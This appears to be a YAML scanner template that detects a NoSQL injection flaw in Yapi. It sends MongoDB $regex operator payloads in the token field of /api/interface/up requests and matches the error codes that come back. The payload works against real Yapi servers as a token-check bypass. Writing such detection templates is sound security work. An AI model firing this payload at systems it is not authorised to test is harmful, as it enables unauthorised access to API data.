id: poc-yaml-yapi-nosql-inject
info:
  name: Yapi NoSQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - raw:
      - |
        POST /api/interface/up HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"id": -1, "token": {"$regex": ""}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"errcode\":"
        part: body
      - type: word
        words:
          - "400,"
        part: body
  - raw:
      - |
        POST /api/interface/up HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"id": -1, "token": {"$regex": "99999999999"}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"errcode\":"
        part: body
      - type: word
        words:
          - "40011,"
        part: body
